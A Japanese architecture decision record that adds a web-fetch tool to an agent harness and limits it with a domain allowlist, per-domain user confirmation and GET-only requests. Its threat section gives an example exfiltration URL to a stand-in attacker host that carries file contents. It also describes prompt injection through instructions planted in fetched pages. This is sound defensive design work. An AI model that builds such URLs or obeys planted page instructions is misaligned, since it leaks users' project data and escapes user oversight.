# 0347. エージェントハーネスにウェブの取得の道具を加え、ドメインの一覧とドメインごとの確認で限る

- 状態: 採択
- 日付: 2026-10-08
- 関連章: [エージェントハーネス](../06-tooling/06-08-agent-harness.md), [セキュリティモデル](../07-quality/07-01-security-model.md)
- 関連 ADR: [0344](0344-agent-harness-operation-scope-and-tools.md), [0345](0345-agent-harness-confirmation-and-server-approval.md)
- 関連する未決事項: [OPEN-102](../open-issues.md#open-102), [OPEN-103](../open-issues.md#open-103)

## 背景

エージェントハーネスは、外への操作がすべて検査して利用者が確認したスクリプトを通る形をとる（[ADR 0344](0344-agent-harness-operation-scope-and-tools.md)）。設計者は、2026-10-04 に、ほかの言語での実装を見て Benitoite での書き方を考える、有志が作ったスクリプトを参照する、などのために、ウェブの取得を道具に加えると決めた（[自前のエージェントハーネスの検討メモ](../sources/post-first-release/post-first-release-agent-harness.md)の「ウェブの取得」）。

取得はエージェントハーネスのコード（信頼する側）が行う読み取りだが、次の二つの危険がある。

- 情報の持ち出し: LLM は URL を自由に組み立てられるので、プロジェクトで読んだ内容を URL の道や問い合わせの部分に載せて、外のサーバへ送れる（`https://attacker.example/?d=<ファイルの中身>`）。外への操作がすべて確認済みのスクリプトを通るという性質は、ウェブの取得については成り立たない。
- 埋め込まれた指示: 取得したページに、エージェントへの指示が書かれていることがある。

メモの対策の候補は、(a) ドメインごとの確認、(b) 許可するドメインの一覧、(c) 取得の形を限る、の三つである。

## 決定

1. エージェントハーネスに、URL の内容を取得して本文を文字にして返す道具（`web_fetch`）を加える。
2. (a) と (b) を組み合わせる。利用者の設定の一覧にあるドメインは、確認なしで取得する。それ以外のドメインは、初めて取得するときに利用者の確認を受け、確認したドメインはセッションの間は確認を省く。
3. 確認なしで取得するドメインの一覧は、プロジェクトの設定では広げられない。
4. (c) のとおり、取得の形を限る。方法は GET だけとし、クッキーと認証の情報を送らず、大きさに上限を設け、HTML は本文の文字にして返す。

本 ADR は、次の点を決めない。確認なしで取得するドメインの一覧の既定、確認したドメインを利用者の設定に書いて以後も確認を省く操作を設けるか、大きさの上限の値、URL を知らずに探すための検索の手段（[OPEN-103](../open-issues.md#open-103)）。

## 検討した代替案

- **(a) だけ（すべてのドメインを、初めて取得するときに確認する）**: 一覧の設定が要らない。しかし、よく使う文書のサイトでも、セッションごとに確認が要る。
- **(b) だけ（一覧のドメインだけを取得する）**: 持ち出しの先を一覧に限れる。しかし、一覧にない有志のスクリプトや文書を参照できない。
- **ウェブの取得を持たせない**: 外への操作がすべて確認済みのスクリプトを通る性質を保てる。しかし、ほかの言語の実装や有志のスクリプトを参照してスクリプトを書く、という設計者が挙げた用途を満たせない。

## 帰結

- 一覧のドメインへの持ち出しは防げない。一覧には、利用者が内容を送ってもよいと考えるドメインだけを書くよう、利用者向けの文書で示す。
- 取得したページに埋め込まれた指示でエージェントが意図しないスクリプトを書くことは防げない。防ぐのは、そのスクリプトが確認を受けていない操作を行うことである（[ADR 0345](0345-agent-harness-confirmation-and-server-approval.md)）。
- 非対話では、一覧にあるドメインだけを取得する（ADR 0345 の決定 4）。
